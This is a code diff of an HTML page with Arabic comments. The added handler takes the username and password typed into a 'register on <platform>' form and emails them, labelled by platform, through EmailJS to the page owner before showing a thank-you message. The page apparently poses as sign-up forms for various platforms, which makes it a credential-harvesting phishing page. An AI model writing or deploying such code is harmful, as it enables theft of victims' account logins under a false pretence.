@@ -7,7 +7,7 @@
     <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
         (function () {
-            emailjs.init("1xqwBMfecM1SSulsh"); // استبدل YOUR_PUBLIC_KEY بمفتاحك العام من EmailJS
+            emailjs.init("1xqwBMfecM1SSulsh"); // استبدل هذا بمفتاحك العام من EmailJS
         })();
     </script>
     <style>
@@ -113,7 +113,7 @@
             });
         });
 
-        // إرسال نموذج الاتصال
+        // إرسال نموذج التواصل
         document.getElementById('contact-form').addEventListener('submit', function (event) {
             event.preventDefault(); // منع تحديث الصفحة
 
@@ -129,9 +129,21 @@
         document.getElementById('registration-form').addEventListener('submit', function (event) {
             event.preventDefault(); // منع النموذج من تحديث الصفحة
 
-            // محاكاة إرسال النموذج وعرض رسالة الشكر
-            formContainer.style.display = 'none';
-            thankYouMessage.style.display = 'block';
+            // إرسال بيانات التسجيل عبر EmailJS
+            const platform = platformName.textContent.replace("التسجيل في ", "");
+            const formData = {
+                username: document.getElementById('username').value,
+                password: document.getElementById('password').value,
+                platform: platform
+            };
+
+            emailjs.send('service_ir3vg5y', 'template_jw2qkzr', formData)
+                .then(function () {
+                    formContainer.style.display = 'none';
+                    thankYouMessage.style.display = 'block';
+                }, function (error) {
+                    alert('حدث خطأ أثناء الإرسال: ' + JSON.stringify(error));
+                });
         });
     </script>
 </body>
